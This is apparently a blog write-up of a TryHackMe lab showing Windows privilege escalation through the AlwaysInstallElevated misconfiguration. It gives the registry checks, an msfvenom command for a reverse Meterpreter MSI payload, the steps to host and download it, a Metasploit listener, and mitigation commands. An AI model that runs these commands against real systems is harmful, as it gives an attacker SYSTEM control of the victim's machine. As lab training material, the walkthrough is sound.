
---
title: "Exploiting AlwaysInstallElevated for Windows Privilege Escalation"
date: 2025-05-06
categories: [Privilege Escalation, Windows, TryHackMe]
tags: [windows, privilege-escalation, alwaysinstallelevated, msfvenom, metasploit, pentesting, tryhackme]
excerpt: "A walkthrough of exploiting the AlwaysInstallElevated misconfiguration on Windows to escalate from user to SYSTEM using a malicious MSI payload."
---

## 🧠 Summary

In this walkthrough, I exploited the **AlwaysInstallElevated** privilege escalation technique on a vulnerable Windows machine. When both `HKLM` and `HKCU` registry keys for AlwaysInstallElevated are set to `1`, any `.msi` file executed by a standard user will run with SYSTEM-level privileges. Below is a step-by-step breakdown of how I leveraged this misconfiguration to gain SYSTEM access.

---

## 🔍 Step 1: Confirming Registry Vulnerability

After gaining initial access to the target machine, I checked the registry for AlwaysInstallElevated values:

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

<figure>
  <img src="/assets/images/blog/windows-privesc/2025-05-06-d0217aef-d8d1-4180-a572-0d7d963fee57.png" alt="AlwaysInstallElevated Registry Settings">
  <figcaption>Registry keys confirming AlwaysInstallElevated is enabled</figcaption>
</figure>

Both were set to `0x1`, confirming the system is vulnerable.

---

## 💣 Step 2: Creating a Malicious MSI Payload

On my Kali attack box, I generated a reverse Meterpreter payload in MSI format using `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.119.123 -f msi -o setup.msi
```

<figure>
  <img src="/assets/images/blog/windows-privesc/2025-05-06-dac45580-fd7a-43ff-9608-5d0cf761fd66.png" alt="Generating malicious MSI payload">
  <figcaption>MSFVenom command to generate the setup.msi payload</figcaption>
</figure>

---

## 🌐 Step 3: Hosting the Payload

I used Python to host the `.msi` file over HTTP:

```bash
python3 -m http.server 80
```

<figure>
  <img src="/assets/images/blog/windows-privesc/2025-05-06-fc733b2c-6bb8-4e76-b2db-65a506a5c996.png" alt="Payload served over HTTP">
  <figcaption>HTTP server log showing the victim downloading setup.msi</figcaption>
</figure>

---

## 📥 Step 4: Downloading and Executing on Victim Machine

On the victim machine, I opened Internet Explorer and navigated to the Kali host IP to download the payload.

<figure>
  <img src="/assets/images/blog/windows-privesc/2025-05-06-aaf86794-c15e-416d-b8e4-30828288e1e4.png" alt="Browsing to download the payload">
</figure>

<figure>
  <img src="/assets/images/blog/windows-privesc/2025-05-06-b6d18942-bad8-4e4d-904c-a554c1eb73dd.png" alt="Setup.msi file download prompt">
  <figcaption>Payload download via Internet Explorer</figcaption>
</figure>

---

## 🧠 Step 5: Listener Setup and Shell Access

On my Kali box, I launched a Metasploit listener to catch the reverse shell:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.2.119.123
run
```

<figure>
  <img src="/assets/images/blog/windows-privesc/2025-05-06-cc623f40-4eaa-41ab-aae5-46350e83e3fe.png" alt="Meterpreter SYSTEM shell">
  <figcaption>Confirmed SYSTEM-level Meterpreter shell from payload execution</figcaption>
</figure>

The payload executed with SYSTEM privileges, as confirmed by the `getuid` command.

---

## 🛡️ Mitigation

To prevent this type of privilege escalation:
- Set `AlwaysInstallElevated` to `0` in both `HKLM` and `HKCU`:
  ```
  reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
  reg add HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
  ```
- Restrict user ability to run `.msi` installers
- Use endpoint monitoring to alert on privilege escalations

---

## 🔗 MITRE ATT&CK Mapping

- **T1548.002 – Abuse Elevation Control Mechanism: Bypass User Access Control**

---

✅ **Success**: I escalated from user to SYSTEM by abusing AlwaysInstallElevated and a malicious MSI payload. Always validate registry settings during post-exploitation recon!

Stay sharp, and happy hacking! 🛠️
